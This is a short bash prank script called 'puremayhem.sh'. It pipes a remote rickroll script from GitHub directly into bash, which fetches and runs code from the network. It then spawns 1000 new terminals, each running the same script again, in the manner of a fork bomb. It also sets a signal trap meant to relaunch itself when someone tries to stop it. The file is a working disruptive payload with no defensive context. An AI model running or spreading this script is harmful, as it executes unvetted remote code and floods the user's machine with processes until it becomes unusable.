
#!/bin/bash
# puremayhem.sh
# killall Dock

curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
for ((x = 0; x<1000; x++)); 
do
        gnome-terminal -- bash puremayhem.sh
        #bash ./$0
        trap "gnome-terminal -- bash puremayhem.sh" SIGINT SIGTERM SIGKILL
done
